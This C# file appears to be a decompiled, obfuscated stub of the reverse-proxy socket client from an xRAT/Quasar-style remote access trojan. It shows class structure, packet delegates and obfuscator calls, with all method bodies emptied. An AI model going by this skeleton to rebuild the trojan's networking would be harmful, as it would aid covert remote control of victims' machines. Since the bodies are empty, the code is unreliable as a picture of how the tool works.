using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;

public class GClass33
{
	public delegate void GDelegate3(GClass33 s, Exception ex);

	public delegate void GDelegate4(GClass33 s, bool connected);

	public delegate void GDelegate5(GClass33 s, GInterface4 packet);

	public delegate void GDelegate6(GClass33 s, GInterface4 packet, long length, byte[] rawData);

	public enum GEnum8
	{
		const_0,
		const_1
	}

	[CompilerGenerated]
	private sealed class Class27
	{
		public int int_0;

		internal static Class27 U829ok2ICtMxa6F2IL8;

		internal bool method_0(GClass1 t)
		{
			return true;
		}

		static Class27()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			oNWwnk2kcbu0DlVuJ53();
		}

		internal static void kBF8As2YyguLMZrjd1B()
		{
		}

		internal static bool lvkIBf2K0owVEEnti91()
		{
			return true;
		}

		internal static Class27 UwgFhp2OmKbD2pOLhnX()
		{
			return null;
		}

		internal static int BcApK8262LycbRnc37V(object object_0)
		{
			return 0;
		}

		internal static void oNWwnk2kcbu0DlVuJ53()
		{
		}
	}

	[CompilerGenerated]
	private GDelegate3 gdelegate3_0;

	[CompilerGenerated]
	private GDelegate4 gdelegate4_0;

	[CompilerGenerated]
	private GDelegate5 gdelegate5_0;

	[CompilerGenerated]
	private GDelegate6 gdelegate6_0;

	private Socket socket_0;

	private List<GClass1> list_0;

	private readonly object object_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private readonly Queue<byte[]> queue_0;

	private bool bool_0;

	private readonly object object_1;

	private readonly Queue<byte[]> queue_1;

	private bool bool_1;

	private readonly object object_2;

	private byte[] byte_2;

	private bool bool_2;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private GEnum8 genum8_0;

	[CompilerGenerated]
	private bool bool_3;

	[CompilerGenerated]
	private Serializer serializer_0;

	internal static GClass33 DZykOk243f8r48YwHTn;

	public int BUFFER_SIZE => 0;

	public uint KEEP_ALIVE_TIME => 0u;

	public uint KEEP_ALIVE_INTERVAL => 0u;

	public int HEADER_SIZE => 0;

	public int MAX_PACKET_SIZE => 0;

	public GClass1[] ProxyClients => null;

	public bool Connected
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	protected Serializer Serializer
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public event GDelegate3 Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate4 Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate5 Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate6 Event_3
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	private void method_0(Exception ex)
	{
	}

	private void method_1(bool connected)
	{
	}

	private void method_2(GInterface4 packet)
	{
	}

	private void method_3(GInterface4 packet, long length, byte[] rawData)
	{
	}

	protected GClass33()
	{
	}

	protected void method_4(IPAddress ip, ushort port)
	{
	}

	private void method_5(IAsyncResult result)
	{
	}

	private void method_6(object state)
	{
	}

	public void method_7<T>(T packet) where T : GInterface4
	{
	}

	public void method_8<T>(T packet) where T : GInterface4
	{
	}

	private void method_9(object state)
	{
	}

	private byte[] method_10(byte[] payload)
	{
		return null;
	}

	private void method_11(bool clear = false)
	{
	}

	public void method_12()
	{
	}

	public void method_13(ReverseProxyConnect command)
	{
	}

	public GClass1 method_14(int connectionId)
	{
		return null;
	}

	public void method_15(int connectionId)
	{
	}

	static GClass33()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		NEFnd02xGHxhbrg48iI();
	}

	internal static object EMQlbj2LD854QDF8esy(object object_3, object object_4)
	{
		return null;
	}

	internal static bool IfVo0r2nbmQTapjeGHE()
	{
		return true;
	}

	internal static GClass33 yPYd7e2Uxol4QpStq5L()
	{
		return null;
	}

	internal static void cBpWPA2NdQqAEPDVSyB(object object_3, object object_4, object object_5)
	{
	}

	internal static object Q2S9TT2jLWfpM3rac6Q(object object_3, object object_4)
	{
		return null;
	}

	internal static void QhSSqM2aiDyn5wQZZjL(object object_3, object object_4, bool connected)
	{
	}

	internal static void t822bc2Mi35GeskxCDP(object object_3)
	{
	}

	internal static void ROuUDT2qgFZbIK8NAX0()
	{
	}

	internal static void FP3bYR2eFS3R10Lvgnv(object object_3, uint keepAliveInterval, uint keepAliveTime)
	{
	}

	internal static void aop2l82XIZCfU0bSsI8(object object_3, object object_4, int int_5)
	{
	}

	internal static object p5ddHH2ga4pNiAFp1G4(object object_3, object object_4, int int_5, int int_6, SocketFlags socketFlags_0, object object_5, object object_6)
	{
		return null;
	}

	internal static object UGp7xS27pI1RwlgZVYQ(int int_5)
	{
		return null;
	}

	internal static void piDigC2S8nnRnXv4c4H(object object_3, int int_5, object object_4, int int_6, int int_7)
	{
	}

	internal static int bEDFnV23IjobjBMMn1M(object object_3, int int_5)
	{
		return 0;
	}

	internal static object unTlqJ2v8biPAiTi2e4(object object_3)
	{
		return null;
	}

	internal static object vAKMiW2yrIBsrnuC5Ct(object object_3, object object_4)
	{
		return null;
	}

	internal static void rJmEGY2P3yGKZqAB2vF(object object_3)
	{
	}

	internal static int iwu1Al2V7xi2wUR43El(object object_3)
	{
		return 0;
	}

	internal static int JCobdg2F0TT51o8IVw6(object object_3, object object_4)
	{
		return 0;
	}

	internal static object iOHqDR2EqPfuvrbHTEv(object object_3)
	{
		return null;
	}

	internal static object Hr1c7a2wuuCPgrHZpTk(int int_5)
	{
		return null;
	}

	internal static void nddA532mr5Bfkw1Qil4(object object_3)
	{
	}

	internal static void ir5lxv222EOSD4h5LYh(object object_3)
	{
	}

	internal static void gaahWm2t5LbVRZwamp5(object object_3, int int_5)
	{
	}

	internal static int vegQEb2CN5AD4MoaOfm(object object_3)
	{
		return 0;
	}

	internal static void NEFnd02xGHxhbrg48iI()
	{
	}
}
